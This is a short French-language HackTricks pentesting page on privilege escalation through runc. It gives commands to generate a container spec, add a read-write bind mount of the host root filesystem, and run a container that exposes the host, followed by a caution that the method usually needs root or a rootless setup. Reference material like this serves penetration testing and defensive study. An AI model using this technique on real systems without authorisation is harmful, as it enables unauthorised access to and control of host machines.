# Escalade de privilèges RunC

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Si vous souhaitez en savoir plus sur **runc**, consultez la page suivante :


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Si vous constatez que `runc` est installé sur l’hôte, vous pourrez peut-être **exécuter un container en montant le dossier racine / de l’hôte**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Cela ne fonctionnera pas toujours, car l’opération par défaut de runc consiste à s’exécuter en tant que root. L’exécuter en tant qu’utilisateur non privilégié ne peut donc tout simplement pas fonctionner (sauf si vous disposez d’une configuration rootless). Faire d’une configuration rootless la configuration par défaut n’est généralement pas une bonne idée, car les conteneurs rootless sont soumis à plusieurs restrictions qui ne s’appliquent pas aux conteneurs non rootless.

{{#include ../../banners/hacktricks-training.md}}
